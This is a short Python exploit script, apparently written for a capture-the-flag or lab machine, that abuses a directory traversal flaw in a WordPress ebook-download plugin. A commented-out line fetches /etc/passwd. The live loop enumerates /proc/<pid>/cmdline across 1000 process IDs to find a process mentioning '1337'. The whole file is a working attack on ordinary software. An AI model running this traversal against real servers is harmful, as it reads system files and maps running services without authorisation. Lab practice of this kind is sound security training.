import requests


# response = requests.get("http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../../etc/passwd")
for pid in range(1000):
    #print(str(pid))
    response = requests.get("http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../../proc/"+str(pid)+"/cmdline")
    if "1337" in response.text:
        print("PID = "+str(pid))
        print(response.text)